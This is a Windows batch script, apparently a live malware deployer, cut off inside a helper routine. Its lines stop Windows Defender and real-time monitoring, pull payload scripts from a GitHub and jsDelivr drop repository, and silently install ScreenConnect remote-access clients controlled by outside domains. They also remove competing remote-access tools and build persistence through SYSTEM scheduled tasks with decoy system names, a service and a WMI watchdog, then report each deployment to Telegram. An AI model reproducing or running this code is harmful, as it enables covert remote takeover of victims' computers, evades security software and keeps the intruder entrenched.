@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260804O52 - MSI OLE magic; soft AV (no Sense kill / no WinDefend disable)
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "GRYXA=ScreenConnect Client (36e506ff016b2151)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "KEEP3=36e506ff016b2151"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSIURL_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "MSI_G=%TEMP%\sc_gryxa.msi"
set "MSICACHE_G=%WD%\pkg_gryxa.msi"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM O47b: unharden workdir on entry — LockDir (SYSTEM+Admin only) froze hosts on old
REM builds by blocking self-update downloads. Re-open so the tick can always update.
attrib -h -s -r "%WD%" >nul 2>&1
attrib -h -s -r "%WD%\*" >nul 2>&1
icacls "%WD%" /reset /T /C /Q >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O50 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O41b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O50" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O41 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O46 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Refresh core payloads (always fetch latest; embed = offline fallback only)...
set "STG=%SystemRoot%\Temp\.upd"
if not exist "%STG%" mkdir "%STG%" >nul 2>&1
attrib -h -s -r "%WD%" >nul 2>&1
icacls "%WD%" /grant "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" /C /Q >nul 2>&1
attrib -h -s -r "%WD%\own_mon.cmd" "%WD%\own_secure.cmd" "%WD%\tg_report.ps1" "%WD%\own_lib.ps1" >nul 2>&1

rem O48: ALWAYS pull latest from repo (staged in Temp, never blocked by WD lock).
rem Embed below is only a fallback when there is no network.
set "NETOK=0"
"%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP%/own_lib.ps1?t=%RANDOM%" >nul 2>&1
if not exist "%STG%\own_lib.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && set "NETOK=1"

if "%NETOK%"=="1" (
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP%/own_mon.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_mon.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP%/own_secure.cmd?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\own_secure.cmd" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP%/tg_report.ps1?t=%RANDOM%" >nul 2>&1
  if not exist "%STG%\tg_report.ps1" "%CURL%" -L --connect-timeout 12 --max-time 60 -o "%STG%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
  rem BUILD-verify each then move into WD
  findstr /C:"OWN_MON  BUILD" "%STG%\own_mon.cmd" >nul 2>&1 && for %%F in ("%STG%\own_mon.cmd") do if %%~zF GTR 1500 move /y "%STG%\own_mon.cmd" "%WD%\own_mon.cmd" >nul 2>&1
  findstr /C:"OWN_SECURE BUILD" "%STG%\own_secure.cmd" >nul 2>&1 && for %%F in ("%STG%\own_secure.cmd") do if %%~zF GTR 800 move /y "%STG%\own_secure.cmd" "%WD%\own_secure.cmd" >nul 2>&1
  findstr /C:"OWN_LIB  BUILD" "%STG%\own_lib.ps1" >nul 2>&1 && for %%F in ("%STG%\own_lib.ps1") do if %%~zF GTR 1500 move /y "%STG%\own_lib.ps1" "%WD%\own_lib.ps1" >nul 2>&1
  findstr /C:"TG_REPORT BUILD" "%STG%\tg_report.ps1" >nul 2>&1 && for %%F in ("%STG%\tg_report.ps1") do if %%~zF GTR 1500 move /y "%STG%\tg_report.ps1" "%WD%\tg_report.ps1" >nul 2>&1
  echo core_fetch_latest_done>>"%LOG%"
) else (
  echo net_offline_using_embed>>"%LOG%"
  call :Extract B64_MON "%WD%\own_mon.cmd"
  call :Extract B64_SEC "%WD%\own_secure.cmd"
  call :Extract B64_TGR "%WD%\tg_report.ps1"
  call :Extract B64_LIB "%WD%\own_lib.ps1"
  if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
  echo embed_extract_done>>"%LOG%"
)
del /f /q "%STG%\own_mon.cmd" "%STG%\own_secure.cmd" "%STG%\own_lib.ps1" "%STG%\tg_report.ps1" >nul 2>&1

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & powershell -NoProfile -NonInteractive -Command \"try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}\" >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM L45 HANDS-OFF: never rmdir ScreenConnect install dirs
REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_SKIPPED_hands_off>>"%LOG%"
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf_SKIPPED_hands_off>>"%LOG%"
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
REM L45/M48 HANDS-OFF: never msiexec any ScreenConnect — diagnose disconnects first
echo hands_off_skip_primary_msi>>"%LOG%"
goto :after_primary_install
REM O53/L44: refuse sevrz /i when ANY Gryxa/non-sevrz SC present OR ExpectedFp svc exists.
REM ImagePath often lacks gryxa.com — also gate on ExpectedFp + protect-msi before /i.
set "GPRESENT=0"
sc query "ScreenConnect Client (36e506ff016b2151)" >nul 2>&1
if not errorlevel 1 set "GPRESENT=1"
for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
  set "_FP=%%a"
  set "_FP=!_FP: =!"
  if /I not "!_FP!"=="%KEEP1%" if /I not "!_FP!"=="%KEEP2%" (
    sc query "ScreenConnect Client (!_FP!)" | findstr /I /C:"RUNNING" /C:"START_PENDING" >nul
    if not errorlevel 1 set "GPRESENT=1"
  )
  for /f "usebackq delims=" %%I in (`reg query "HKLM\SYSTEM\CurrentControlSet\Services\ScreenConnect Client (!_FP!)" /v ImagePath 2^>nul ^| findstr /I "ImagePath"`) do (
    echo %%I | findstr /I "gryxa.com" >nul && set "GPRESENT=1"
  )
)
if "!GPRESENT!"=="1" (
  echo primary_skip_i_protect_gryxa>>"%LOG%"
  goto :after_primary_install
)
echo primary_install_begin>>"%LOG%"
set "MSI_SAFE="
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%S in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action protect-msi -WorkDir "%WD%" -Extra "%MSI%" 2^>nul`) do if not "%%S"=="FAIL" if exist "%%S" set "MSI_SAFE=%%S"
)
if not defined MSI_SAFE (
  echo primary_protect_fail_skip_i>>"%LOG%"
  goto :after_primary_install
)
msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "!MSI_SAFE!" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O41: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [5b] Gryxa MUST-RUN deep ensure (svc+dir+TCP/relay+FP drift)...
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  call :EnsureGryxaMust
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo gryxa_force_after_deep>>"%LOG%"
  del /f /q "%WD%\gryxa_reinstall.flag" >nul 2>&1
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -Deep -Force -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
  if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
  if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
)
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O39/L13: Create like WucacheOwn â€” BOOT TR path + cmd schtasks + /ST (WD is ACL-locked)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=WerQueueSync"
if not defined TASK_B set "TASK_B=PlaServerHealth"
if not defined TASK_C set "TASK_C=WdiHostProxy"
if not defined TASK_D set "TASK_D=TcpIpConflictRes"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
REM strip leading \ if present (IDENTVER 6/7 leftovers)
if "!TASK_A:~0,1!"=="\" set "TASK_A=!TASK_A:~1!"
if "!TASK_B:~0,1!"=="\" set "TASK_B=!TASK_B:~1!"
if "!TASK_C:~0,1!"=="\" set "TASK_C=!TASK_C:~1!"
if "!TASK_D:~0,1!"=="\" set "TASK_D=!TASK_D:~1!"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"

REM TR under BOOT (Windows\Temp\.wucache) â€” same tree as working WucacheOwn detach
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\own_mon.cmd" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%BOOT%\etl_mon.cmd" >nul 2>&1
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd" >nul 2>&1

for /f "tokens=1-2 delims=:" %%H in ("%TIME%") do set "ST=%%H:%%I"
set "ST=!ST: =0!"
echo create_taskA_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_A!" /F >nul 2>&1
schtasks /Create /TN "!TASK_A!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_A! /ST !ST! /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskB_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_B!" /F >nul 2>&1
schtasks /Create /TN "!TASK_B!" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO !MO_B! /ST !ST! /F /TR "cmd.exe /c %BOOT%\etl_mon.cmd" >>"%LOG%" 2>&1
echo create_taskC_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_C!" /F >nul 2>&1
schtasks /Create /TN "!TASK_C!" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo create_taskD_begin>>"%LOG%"
schtasks /Delete /TN "!TASK_D!" /F >nul 2>&1
schtasks /Create /TN "!TASK_D!" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %BOOT%\own_mon.cmd" >>"%LOG%" 2>&1
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "!TASK_A!" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_B!" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_C!" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "!TASK_D!" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "!TASK_A!" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM also run lib tasks-ensure (idempotent repair / ownership check)
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%BOOT%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O42 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
)
rem O51: OLE magic d0cf11e0 — reject HTML/error pages (same class as L37 Gryxa)
powershell -NoProfile -NonInteractive -Command "$p=$args[0]; $fs=[IO.File]::OpenRead($p); $b=New-Object byte[] 4; [void]$fs.Read($b,0,4); $fs.Close(); if($b[0]-eq 0xD0 -and $b[1]-eq 0xCF -and $b[2]-eq 0x11 -and $b[3]-eq 0xE0){exit 0}else{exit 1}" "%~1" >nul 2>&1
if errorlevel 1 (
  echo msi_bad_magic>>"%LOG%"
  del /f /q "%~1" >nul 2>&1
  exit /b 1
)
copy /y "%~1" "%MSICACHE%" >nul 2>&1
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
